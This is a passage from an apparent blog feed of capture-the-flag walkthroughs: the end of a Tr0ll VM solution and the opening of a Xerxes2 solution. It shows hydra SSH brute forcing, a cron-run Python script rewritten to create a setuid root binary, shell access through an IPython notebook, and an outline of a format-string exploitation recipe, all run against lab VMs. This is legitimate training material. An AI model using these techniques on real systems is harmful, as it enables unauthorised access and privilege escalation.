&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Well that worked, and showed that we have a file &lt;code&gt;lol.pcap&lt;/code&gt; to look at. Interesting. I fired up wireshark and opened the pcap. Following the TCP streams it looked like in a previous session there was activity with a file called &lt;code&gt;secret_stuff.txt&lt;/code&gt; that is no longer available. I filtered out that stream and continued down the rabbit hole, until I saw the message:&lt;/p&gt;


&lt;figure &gt;
    
        &lt;img src=&#34;https://leonjza.github.io/images/troll_pcap.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;Ok. Well. I tried a few things after this, until eventually I figured it may be a web path. Sooo, off to the website we went and browsed to &lt;a href=&#34;http://192.168.56.101/sup3rs3cr3tdirlol/&#34;&gt;http://192.168.56.101/sup3rs3cr3tdirlol/&lt;/a&gt;. In this path there was a binary  called &lt;code&gt;roflmao&lt;/code&gt;. I downloaded the bin and did some static analysis (paranoid and all that) to see if I can figure out what it does before running it. Eventually I just made it executable and ran it:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;root@kali:~# wget http://192.168.56.101/sup3rs3cr3tdirlol/roflmao
--2014-08-15 07:57:56--  http://192.168.56.101/sup3rs3cr3tdirlol/roflmao
Connecting to 192.168.56.101:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 7296 (7.1K)
Saving to: `roflmao&#39;

100%[======&amp;gt;] 7,296       --.-K/s   in 0s

2014-08-15 07:57:56 (826 MB/s) - `roflmao&#39; saved [7296/7296]

root@kali:~/Desktop/Tr0ll# chmod +x roflmao
root@kali:~/Desktop/Tr0ll# ./roflmao
Find address 0x0856BF to proceed
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Nice. &lt;code&gt;0x0856BF&lt;/code&gt; is not exactly helpful. But what does it mean? From the previous analysis I have done it also looked like the bin is really just printing the string as can be seen above. After some poking around and exchanging ideas with &lt;a href=&#34;https://twitter.com/barrebas&#34;&gt;@barrebas&lt;/a&gt; on IRC, I remembered that the previous vague hint was a directory on the web site. So, I tried &lt;a href=&#34;http://192.168.56.101/0x0856BF/:&#34;&gt;http://192.168.56.101/0x0856BF/:&lt;/a&gt;&lt;/p&gt;


&lt;figure &gt;
    
        &lt;img src=&#34;https://leonjza.github.io/images/troll_0x856bf.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;h2 id=&#34;nohydraplz&#34;&gt;nohydraplz&lt;/h2&gt;

&lt;p&gt;Cool! At this stage I was pretty sure there was not much left to gain shell. The folder &lt;code&gt;good_luck&lt;/code&gt; had a file called &lt;code&gt;which_one_lol.txt&lt;/code&gt; with contents:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;maleus
ps-aux
felux
Eagle11
genphlux &amp;lt; -- Definitely not this one
usmc8892
blawrg
wytshadow
vis1t0r
overflow
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;List of passwords? Dunno. The folder &lt;code&gt;this_folder_contains_the_password&lt;/code&gt; had a file &lt;code&gt;Pass.txt&lt;/code&gt; with contents:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;Good_job_:)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;At this stage I figured this had to be either a nicely provided wordlist for some &lt;code&gt;hydra&lt;/code&gt; action on the &lt;code&gt;ftp&lt;/code&gt; || &lt;code&gt;ssh&lt;/code&gt; service. So naturally, I copied the information to a file called &lt;code&gt;list.txt&lt;/code&gt; (also made a copy of the &lt;code&gt;genphlux&lt;/code&gt; word so that its on its own line), and fired up hydra on &lt;code&gt;ssh&lt;/code&gt;:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;root@kali:~# hydra -v -V -u -L list -P list -t 1 -u 192.168.56.101 ssh
Hydra v7.6 (c)2013 by van Hauser/THC &amp;amp; David Maciejak - for legal purposes only

[DATA] attacking service ssh on port 22
[VERBOSE] Resolving addresses ... done
[ATTEMPT] target 192.168.56.101 - login &amp;quot;maleus&amp;quot; - pass &amp;quot;maleus&amp;quot; - 1 of 169 [child 0]
[ATTEMPT] target 192.168.56.101 - login &amp;quot;ps-aux&amp;quot; - pass &amp;quot;maleus&amp;quot; - 2 of 169 [child 0]
[ATTEMPT] target 192.168.56.101 - login &amp;quot;felux&amp;quot; - pass &amp;quot;maleus&amp;quot; - 3 of 169 [child 0]
[ATTEMPT] target 192.168.56.101 - login &amp;quot;Eagle11&amp;quot; - pass &amp;quot;maleus&amp;quot; - 4 of 169 [child 0]
[ATTEMPT] target 192.168.56.101 - login &amp;quot;genphlux &amp;lt; -- Definitely not this one&amp;quot; - pass &amp;quot;maleus&amp;quot; - 5 of 169 [child 0]
[ATTEMPT] target 192.168.56.101 - login &amp;quot;genphlux&amp;quot; - pass &amp;quot;maleus&amp;quot; - 6 of 169 [child 0]
[ATTEMPT] target 192.168.56.101 - login &amp;quot;usmc8892&amp;quot; - pass &amp;quot;maleus&amp;quot; - 7 of 169 [child 0]

[ERROR] could not connect to target port 22
[ERROR] ssh protocol error
[VERBOSE] Retrying connection for child 0
[RE-ATTEMPT] target 192.168.56.101 - login &amp;quot;usmc8892&amp;quot; - pass &amp;quot;maleus&amp;quot; - 7 of 169 [child 0]

[ERROR] could not connect to target port 22
[ERROR] ssh protocol error
[VERBOSE] Retrying connection for child 0
[RE-ATTEMPT] target 192.168.56.101 - login &amp;quot;usmc8892&amp;quot; - pass &amp;quot;maleus&amp;quot; - 7 of 169 [child 0]
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Err, the sudden errors only meant one thing&amp;hellip; &lt;code&gt;fail2ban&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;root@kali:~# nmap -v --reason -Pn 192.168.56.101 -p 22

PORT   STATE    SERVICE REASON
22/tcp filtered ssh     no-response

&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;So, this was the first part that frustrated me and had me going &lt;em&gt;&amp;ldquo;seriously&amp;hellip; :\&amp;rdquo;&lt;/em&gt;. Maybe this was actually a list of &lt;code&gt;ftp&lt;/code&gt; creds? Sadly, that did not seem to be the case either. And so I was stuck once again. Hydra was slowly trickling on once the ssh service was unbanned again, but it was annoying as heck.&lt;/p&gt;

&lt;h2 id=&#34;first-shell&#34;&gt;first shell&lt;/h2&gt;

&lt;p&gt;I kept bouncing the VM to get the ssh service back faster, allowing hydra to do it&amp;rsquo;s &lt;code&gt;thing&lt;/code&gt;. Eventually, it was apparent that none of these words as a username/password combination was the correct one.&lt;/p&gt;

&lt;p&gt;Returning to the web interface and the word lists, I realized (with some subtle hints and reminders from @barrebas to &lt;em&gt;read&lt;/em&gt; everything), that the password may be in this folder (&lt;code&gt;this_folder_contains_the_password&lt;/code&gt;). Get it, the &lt;code&gt;Pass.txt&lt;/code&gt; is the password&amp;hellip;&lt;/p&gt;

&lt;p&gt;Right, so I changed &lt;code&gt;hydra&lt;/code&gt; slightly to use &lt;code&gt;Pass.txt&lt;/code&gt; as a password and continued to brute with the original &lt;code&gt;list.txt&lt;/code&gt; as usernames:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;root@kali:~# hydra -v -V -u -L list -p &amp;quot;Pass.txt&amp;quot; -t 1 -u 192.168.56.101 ssh
Hydra v7.6 (c)2013 by van Hauser/THC &amp;amp; David Maciejak - for legal purposes only

[DATA] 1 task, 1 server, 13 login tries (l:13/p:1), ~13 tries per task
[DATA] attacking service ssh on port 22
[VERBOSE] Resolving addresses ... done
[ATTEMPT] target 192.168.56.101 - login &amp;quot;maleus&amp;quot; - pass &amp;quot;Pass.txt&amp;quot; - 1 of 13 [child 0]
[ATTEMPT] target 192.168.56.101 - login &amp;quot;ps-aux&amp;quot; - pass &amp;quot;Pass.txt&amp;quot; - 2 of 13 [child 0]
[ATTEMPT] target 192.168.56.101 - login &amp;quot;felux&amp;quot; - pass &amp;quot;Pass.txt&amp;quot; - 3 of 13 [child 0]
[...]
[22][ssh] host: 192.168.56.101   login: overflow   password: Pass.txt
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Yay &lt;code&gt;overflow:Pass.txt&lt;/code&gt; should get us a session via ssh:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;root@kali:~/Desktop/Tr0ll# ssh overflow@192.168.56.101
overflow@192.168.56.101&#39;s password:
Welcome to Ubuntu 14.04.1 LTS (GNU/Linux 3.13.0-32-generic i686)

[...]

Could not chdir to home directory /home/overflow: No such file or directory
$ id
uid=1002(overflow) gid=1002(overflow) groups=1002(overflow)
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&#34;and-root&#34;&gt;&amp;hellip; and root&lt;/h2&gt;

&lt;p&gt;And so it was time for classic enumeration again. The first &lt;em&gt;strange&lt;/em&gt; thing was the fact that it appeared as if all the &lt;code&gt;/home&lt;/code&gt; directories apart from &lt;code&gt;/home/troll&lt;/code&gt; was deleted. Weird. Other than that, there were a whole bunch of users according to &lt;code&gt;/etc/passwd&lt;/code&gt;, and I can&amp;rsquo;t run anything as &lt;code&gt;root&lt;/code&gt; via &lt;code&gt;sudo&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;There was a file in &lt;code&gt;/opt/&lt;/code&gt; called &lt;code&gt;lmao.py&lt;/code&gt;, however I did not have access to read it. Soooo, more enumeration.&lt;/p&gt;

&lt;p&gt;&lt;em&gt;suddenly&lt;/em&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;Broadcast Message from root@trol
        (somewhere) at 16:05 ...

TIMES UP LOL!

Connection to 192.168.56.101 closed by remote host.
Connection to 192.168.56.101 closed.
root@kali:~#
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Urgh. Turns out, something is killing my ssh session every 5 minutes. &lt;strong&gt;Oh my word&lt;/strong&gt;, was that annoying. I could handle everything the VM&amp;rsquo;s offered, but this was probably the worst part of it.&lt;/p&gt;

&lt;p&gt;Eventually, I was searching for executable files on the filesystem. I was filtering out a large chunk and gradually paging though results to find that odd one out. To help filter out uninteresting stuff, it looked like the VM was built in August, so I just grep for that in the results, hoping that the &lt;em&gt;thing&lt;/em&gt; I should be finding has a more recent timestamp:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;overflow@troll:/$ find / -executable -type f 2&amp;gt; /dev/null | egrep -v &amp;quot;^/bin|^/var|^/etc|^/usr&amp;quot; | xargs ls -lh | grep Aug

-rwxrwxrwx 1 root  root    145 Aug 14 13:11 /lib/log/cleaner.py
-rwx--x--x 1 root  root    117 Aug 10 02:11 /opt/lmao.py
-rwxr-xr-x 1 root  root   2.4K Aug 27  2013 /sbin/installkernel
-rwxrwxrwx 1 troll root   7.9K Aug 10 00:43 /srv/ftp/lol.pcap
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;A few interesting results came from that, however, the one that held the golden nugget was &lt;code&gt;/lib/log/cleaner.py&lt;/code&gt;. During my enumeration I noticed that &lt;code&gt;/tmp&lt;/code&gt; got cleaned out at a really strange time as I was still trying to &lt;code&gt;less&lt;/code&gt; a file in there, however, it just &lt;em&gt;disappeared&lt;/em&gt;.&lt;/p&gt;

&lt;p&gt;Anyways, as &lt;code&gt;cleaner.py&lt;/code&gt; was owned by root and running &lt;code&gt;os.system&lt;/code&gt;, I just modified it to prepare me a classic &lt;code&gt;getroot&lt;/code&gt; binary:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;#!/usr/bin/env python
import os
import sys
try:
    os.system(&#39;chown root:root /var/tmp/getroot; chmod 4755 /var/tmp/getroot &#39;)
except:
    sys.exit()
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;I waited for that annoying &amp;lsquo;Times UP&amp;rsquo; message, and inspected &lt;code&gt;/var/tmp&lt;/code&gt;:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;overflow@troll:/$ ls -lah /var/tmp/
total 24K
drwxrwxrwt  2 root     root     4.0K Aug 14 13:11 .
drwxr-xr-x 12 root     root     4.0K Aug 10 03:56 ..
-rwxrwxrwx  1 root     root       34 Aug 13 01:16 cleaner.py.swp
-rwsr-xr-x  1 root     root     7.2K Aug 14 13:09 getroot
-rw-rw-r--  1 overflow overflow   71 Aug 14 13:09 sh.c

overflow@troll:/$ /var/tmp/getroot
#
# id
uid=0(root) gid=1002(overflow) groups=0(root),1002(overflow)

# ls /root
proof.txt

# cat /root/proof.txt
Good job, you did it!


702a8c18d29c6f3ca0d99ef5712bfbdc
#
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&#34;for-the-curious&#34;&gt;for the curious&lt;/h2&gt;

&lt;p&gt;That really annoying session that keeps dying? Turns out its &lt;code&gt;/opt/lmao.py&lt;/code&gt; to blame:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;# cat /opt/lmao.py
#!/usr/bin/env python
import os

os.system(&#39;echo &amp;quot;TIMES UP LOL!&amp;quot;|wall&#39;)
os.system(&amp;quot;pkill -u &#39;overflow&#39;&amp;quot;)
sys.exit()

#
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Thanks &lt;a href=&#34;https://twitter.com/maleus21&#34;&gt;@maleus21&lt;/a&gt; for the VM!&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>Beating Xerxes2</title>
      <link>https://leonjza.github.io/blog/2014/08/09/beating-xerxes2/</link>
      <pubDate>Sat, 09 Aug 2014 16:59:53 +0000</pubDate>
      
      <guid>https://leonjza.github.io/blog/2014/08/09/beating-xerxes2/</guid>
      <description>

&lt;h2 id=&#34;foreword&#34;&gt;foreword&lt;/h2&gt;

&lt;p&gt;Xerxes2 is a successor in a boot2root series by &lt;a href=&#34;https://twitter.com/barrebas&#34;&gt;@barrebas&lt;/a&gt; hosted by &lt;a href=&#34;https://twitter.com/vulnhub&#34;&gt;@VulnHub&lt;/a&gt;. If you haven&amp;rsquo;t done it yet, close this article &lt;em&gt;now&lt;/em&gt; and go learn by doing it!&lt;/p&gt;

&lt;p&gt;Xerxes2, like most other boot2root type CTF&amp;rsquo;s, has once again forced me to learn a whole lot more than I thought possible. In total it took me about 3 or 4 days on and off to complete. The goal was as usual, read &lt;code&gt;/root/flag.txt&lt;/code&gt;. This is the path I took to read the flag and gain root command execution. Enjoy!&lt;/p&gt;

&lt;h2 id=&#34;getting-started&#34;&gt;getting started&lt;/h2&gt;

&lt;p&gt;The tool of choice for Xerxes2 was again Kali Linux. I started up the VM and got the IP Address 192.158.56.102 assigned to it. So, to officially kick off the challenge, I started a NMAP scan:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;root@kali:~# nmap -v --reason -sV 192.168.56.102 -p-

Starting Nmap 6.46 ( http://nmap.org ) at 2014-08-09 17:14 SAST
[...]
PORT      STATE SERVICE REASON  VERSION
22/tcp    open  ssh     syn-ack OpenSSH 6.0p1 Debian 4+deb7u2 (protocol 2.0)
80/tcp    open  http    syn-ack lighttpd 1.4.31
111/tcp   open  rpcbind syn-ack 2-4 (RPC #100000)
4444/tcp  open  krb524? syn-ack
8888/tcp  open  http    syn-ack Tornado httpd 2.3
57504/tcp open  status  syn-ack 1 (RPC #100024)
[...]
Nmap done: 1 IP address (1 host up) scanned in 192.62 seconds
           Raw packets sent: 131149 (5.770MB) | Rcvd: 88 (3.544KB)

&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Well this gives us a boat load to test out already!&lt;/p&gt;

&lt;p&gt;I quickly telneted’ to tcp/4444, and got presented with a large string being echoed back. To the eye this looked like a very large base64 string, so I opened &lt;code&gt;nc&lt;/code&gt; to the port and redirected the output to a file &lt;code&gt;nc-string&lt;/code&gt;. Once the string echoed completely, I quit the &lt;code&gt;nc&lt;/code&gt;, and pushed the resultant string through a base64 decode and ran a &lt;code&gt;file&lt;/code&gt; against it:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;root@kali:~#  nc 192.168.56.102 4444 | tee nc-string
[...]
qqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqkxBTUUzLjk5LjWqqqqq
qqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqq//OCxDsAAANIAAAA
AKqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqq
qqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqq
qqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqq
qqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqo=
^C

root@kali:~# cat nc-string | base64 -d &amp;gt; nc-data
root@kali:~# file nc-data
nc-data: MPEG ADTS, layer III, v2,  64 kbps, 22.05 kHz, Monaural

&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;code&gt;nc-data&lt;/code&gt; is a, audio file? Ok. I copied the file off Kali Linux, opened it in VLC player and pressed play.&lt;/p&gt;

&lt;p&gt;&lt;em&gt;(Electronic Noises &amp;amp; Robot Voice)&lt;/em&gt; &lt;em&gt;This is Xerxes. Why do you persist in your loneliness?&lt;/em&gt; &lt;em&gt;(Electronic Noises)&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;The start and end of the voice message had a clear in &amp;amp; out sound, with some static noises in the background. Then, at the end a strange whistling noise could be heard.&lt;/p&gt;

&lt;p&gt;This was the first educational bus ride the Xerxes2 took me on. Learning about the structures of mp3 files etc.&lt;/p&gt;

&lt;p&gt;Sadly, this file kept me busy for quite some time, trying to find a hidden message. In the end, I gave up and moved on to the other ports open the VM. Maybe I had to come back to this later, but the little progress I had made had me hope I didn&amp;rsquo;t have to.&lt;/p&gt;

&lt;h2 id=&#34;first-shell-access&#34;&gt;first shell access&lt;/h2&gt;

&lt;p&gt;Moving on to tcp/80, a standard website with not much interesting apart from a cool looking Xerxes2 logo was found:&lt;/p&gt;


&lt;figure &gt;
    
        &lt;img src=&#34;https://leonjza.github.io/images/xerxesII_home.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;However, moving on to tcp/8888, we see it identified as &lt;code&gt;Tornado httpd 2.3&lt;/code&gt;. Some of you may recognize Tornado as a python httpd server. So, off to a browser we go!&lt;/p&gt;

&lt;p&gt;tcp/8888 hosted a &lt;a href=&#34;http://ipython.org/notebook.html&#34;&gt;IPython Notebook&lt;/a&gt;. We were able to easily create a new note, and abuse the shell command functionality of it for our own purposes. Shell command access could be achieved by prefixing typical shell commands with a &lt;code&gt;!&lt;/code&gt;. I used this to enumerate a small bit of the current environment, and quickly decided to add myself a ssh key so that I can play further. So, I generated a new key pair just for Xerxes, and uploaded it for the &lt;code&gt;delacroix&lt;/code&gt; user:&lt;/p&gt;


&lt;figure &gt;
    
        &lt;img src=&#34;https://leonjza.github.io/images/xerxesII_ipython.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;And then a easy SSH in:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;root@kali:~# ssh -i delacroix delacroix@192.168.56.102
The authenticity of host &#39;192.168.56.102 (192.168.56.102)&#39; can&#39;t be established.
ECDSA key fingerprint is c1:ca:ae:c3:5d:7a:5b:9d:cf:27:a4:48:83:1e:01:84.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added &#39;192.168.56.102&#39; (ECDSA) to the list of known hosts.

Welcome to xerxes2.
      XERXES wishes you
       a pleasant stay.
____   ___  ____  ___  __ ____   ___  ____     ____     ____
`MM(   )P&#39; 6MMMMb `MM 6MM `MM(   )P&#39; 6MMMMb   6MMMMb\  6MMMMb
 `MM` ,P  6M&#39;  `Mb MM69 &amp;quot;  `MM` ,P  6M&#39;  `Mb MM&#39;    ` MM&#39;  `Mb
  `MM,P   MM    MM MM&#39;      `MM,P   MM    MM YM.           ,MM
   `MM.   MMMMMMMM MM        `MM.   MMMMMMMM  YMMMMb      ,MM&#39;
   d`MM.  MM       MM        d`MM.  MM            `Mb   ,M&#39;
  d&#39; `MM. YM    d9 MM       d&#39; `MM. YM    d9 L    ,MM ,M&#39;
_d_  _)MM_ YMMMM9 _MM_    _d_  _)MM_ YMMMM9  MYMMMM9  MMMMMMMM

delacroix@xerxes2:~$
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&#34;becoming-polito-the-why&#34;&gt;becoming polito - the why&lt;/h2&gt;

&lt;p&gt;Once I had the first SSH access, life was a little less complicated. I could enumerate easier and learn the details about what I was facing. Things that stood out was a binary &lt;code&gt;/opt/bf&lt;/code&gt;, owned by &lt;code&gt;polito&lt;/code&gt; and had the SUID bit set for him. There was also a folder &lt;code&gt;/opt/backup&lt;/code&gt;, with a file &lt;code&gt;korenchkin.tar.enc&lt;/code&gt;. There was also mail in &lt;code&gt;/var/mail&lt;/code&gt; for the user &lt;code&gt;korenchkin&lt;/code&gt; which I am not able to read yet.&lt;/p&gt;

&lt;p&gt;More interestingly, the &lt;code&gt;.bash_history&lt;/code&gt; for the user I am now (delacroix), revealed that the &lt;code&gt;/opt/bf&lt;/code&gt; command was recently run, and the sources for this binary was available as &lt;code&gt;bf.c&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;delacroix@xerxes2:~$ ls -lh
total 8.0K
-rw-r--r-- 1 delacroix delacroix 1.6K Jul 16 12:42 bf.c
-rw-r--r-- 1 delacroix delacroix  100 Aug  9 10:23 Untitled0.ipynb

delacroix@xerxes2:~$ history
    1  cd
    2  ls -alh
    3  /opt/bf &amp;quot;&amp;lt;&amp;lt;++++[&amp;gt;++++&amp;lt;-]&amp;gt;[&amp;gt;+++++&amp;gt;+++++&amp;gt;+++++&amp;gt;+++++&amp;gt;++&amp;gt;++++&amp;gt;++++&amp;gt;++++&amp;gt;+++++&amp;gt;++++&amp;gt;+++++&amp;lt;&amp;lt;&amp;lt;&amp;lt;&amp;lt;&amp;lt;&amp;lt;&amp;lt;&amp;lt;&amp;lt;&amp;lt;-]&amp;gt;----&amp;gt;-&amp;gt;-&amp;gt;-----&amp;gt;&amp;gt;++++&amp;gt;+++++&amp;gt;+++++&amp;gt;&amp;gt;+++++&amp;gt;++#&amp;quot;
    4  cp /media/politousb/bf.c .
    5  nano bf.c
    6  exit
    7  passwd
    8  exit

delacroix@xerxes2:~$ /opt/bf &amp;quot;&amp;lt;&amp;lt;++++[&amp;gt;++++&amp;lt;-]&amp;gt;[&amp;gt;+++++&amp;gt;+++++&amp;gt;+++++&amp;gt;+++++&amp;gt;++&amp;gt;++++&amp;gt;++++&amp;gt;++++&amp;gt;+++++&amp;gt;++++&amp;gt;+++++&amp;lt;&amp;lt;&amp;lt;&amp;lt;&amp;lt;&amp;lt;&amp;lt;&amp;lt;&amp;lt;&amp;lt;&amp;lt;-]&amp;gt;----&amp;gt;-&amp;gt;-&amp;gt;-----&amp;gt;&amp;gt;++++&amp;gt;+++++&amp;gt;+++++&amp;gt;&amp;gt;+++++&amp;gt;++#&amp;quot;
LOOK DEEPERdelacroix@xerxes2:~$
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;As you can see above, running it just prints &lt;strong&gt;LOOK DEEPER&lt;/strong&gt;. I recognized the syntax as &lt;a href=&#34;http://en.wikipedia.org/wiki/Brainfuck&#34;&gt;brainfk&lt;/a&gt; and figured that &lt;code&gt;/opt/bf&lt;/code&gt; was simply a brainfk interpreter. But wait, lets inspect &lt;code&gt;bf.c&lt;/code&gt;!&lt;/p&gt;

&lt;h3 id=&#34;inspecting-bf-c&#34;&gt;inspecting bf.c&lt;/h3&gt;

&lt;p&gt;A quick read of &lt;code&gt;bf.c&lt;/code&gt; confirmed the suspicions that &lt;code&gt;/opt/bf&lt;/code&gt; was simply a brainfk interpreter. A buffer was set for the input program, then a function called &lt;code&gt;bf()&lt;/code&gt; was called to process the brainfk program. Each instruction in the brainfk was handled with a case statement:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;case &#39;.&#39;:
    printf(&amp;quot;%c&amp;quot;, buf[datapointer]);
    break;
case &#39;,&#39;:
    buf[datapointer] = getchar();
    break;
case &#39;&amp;gt;&#39;:
    datapointer = (datapointer == (BUF_SIZE-1)) ? 0 : ++datapointer;
    break;
case &#39;&amp;lt;&#39;:
    datapointer = (datapointer == 0) ? (BUF_SIZE-1) : --datapointer;
    break;
case &#39;+&#39;:
    buf[datapointer]++;
    break;
case &#39;-&#39;:
    buf[datapointer]--;

&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Soooo, here we started on the second educational bus ride to mount brainfk. In summary, I learnt that I could write a program as simple as &lt;code&gt;,.&lt;/code&gt;, and run it with &lt;code&gt;/opt/bf&lt;/code&gt;, which will accept a character and then echo it back to me immediately. I also learnt that if you had say, 62 &lt;code&gt;+&lt;/code&gt;, and ran that with a brainfk interpreter like &lt;code&gt;/opt/bf&lt;/code&gt;, then you would have the character with ASCII value 62 in memory. You can then print that value with &lt;code&gt;.&lt;/code&gt;, or move on the next memory cell with a &lt;code&gt;&amp;lt;&lt;/code&gt;. The most important thing to learn about brainfk was, &lt;em&gt;there are no high level features. No file IO, no socket IO, nothing&lt;/em&gt;.&lt;/p&gt;

&lt;p&gt;That was our brainfk class for the day.&lt;/p&gt;

&lt;h3 id=&#34;finding-the-bf-vuln&#34;&gt;finding the bf vuln&lt;/h3&gt;

&lt;p&gt;With all that brainfk, I was still not closer to actually finding the stepping stone to the next part of Xerxes2. That was until I re-read &lt;code&gt;bf.c&lt;/code&gt;, and realized that one of the case statements was for &lt;code&gt;#&lt;/code&gt;, and that when a hash is present it will run:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;case &#39;#&#39;:
    // new feature
    printf(buf);
    break;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Classic format string vulnerability!&lt;/p&gt;

&lt;p&gt;As exciting as this may seem, it was not really for me. I had already previously struggled with a format string vulnerability, and this case it was present so early in the CTF that I feared I would not be able to complete this one. However, the goal was now clear. I need to &lt;em&gt;somehow&lt;/em&gt; exploit this format string vuln, as brainfk, and get that to run my own code, potentially gaining me a shell as &lt;code&gt;polito&lt;/code&gt;.&lt;/p&gt;

&lt;h2 id=&#34;becoming-polito-the-how&#34;&gt;becoming polito - the how&lt;/h2&gt;

&lt;p&gt;Doing research about format string vulnerabilities, you will see that generally the flow goes something along the lines of:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;print &lt;code&gt;AAAA%x%x%x%x&lt;/code&gt;, adding &lt;code&gt;%s&lt;/code&gt; until you see the hex for of A (41), meaning that you are trying to find the position in the stack that &lt;code&gt;printf&lt;/code&gt; is placing the arguments.&lt;/li&gt;
&lt;li&gt;Test for direct parameter access. Assuming you saw the 41414141 in position 16, test with a payload of &lt;code&gt;AAAA%16$x&lt;/code&gt;.&lt;/li&gt;
&lt;li&gt;&lt;code&gt;objdump -R /your/bin&lt;/code&gt; and find a call in the GOT to override.&lt;/li&gt;
&lt;li&gt;Place some shellcode as environment variable, ie: &lt;code&gt;EGG&lt;/code&gt;, prefixed with say 200 &lt;code&gt;0x90&lt;/code&gt;.&lt;/li&gt;
&lt;li&gt;use &lt;code&gt;gdb&lt;/code&gt;, and find your NOP sled, and choose a position in memory to where you want to override the pointer for a call from the GOT.&lt;/li&gt;
&lt;li&gt;Calculate the required padding of strings to get the correct memory address, and write it using the &lt;code&gt;%n&lt;/code&gt; format string.&lt;/li&gt;
&lt;li&gt;Profit?&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;While this is all fine and dandy, it was not possible for me to &lt;em&gt;profit&lt;/em&gt; with this. :( In fact, the there is nothing wrong with the theory, its just that the conditions were slightly different. &lt;code&gt;/opt/bf&lt;/code&gt; was compiled with the NX bit, and ASLR is enabled. Oh, and I actually have no idea what I am doing :D&lt;/p&gt;

&lt;p&gt;So, let me take this step by step on how &lt;code&gt;/opt/bf&lt;/code&gt; can be exploited using a format string vulnerability, encoded in brainfk, with the NX bit set and ASLR enabled.&lt;/p&gt;

&lt;h3 id=&#34;opt-bf-part1&#34;&gt;/opt/bf - part1&lt;/h3&gt;

&lt;p&gt;To start, I had to recap in the sadly limited knowledge I already have of format string vulnerabilities. Some resources I found useful were:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;http://codearcana.com/posts/2013/05/02/introduction-to-format-string-exploits.html&#34;&gt;http://codearcana.com/posts/2013/05/02/introduction-to-format-string-exploits.html&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;http://codearcana.com/posts/2013/04/28/picoctf-videos.html&#34;&gt;http://codearcana.com/posts/2013/04/28/picoctf-videos.html&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;http://youtu.be/NwzmYSlETI8&#34;&gt;http://youtu.be/NwzmYSlETI8&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;http://youtu.be/CHrs30g-3O0&#34;&gt;http://youtu.be/CHrs30g-3O0&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;So, lets work with this.&lt;/p&gt;

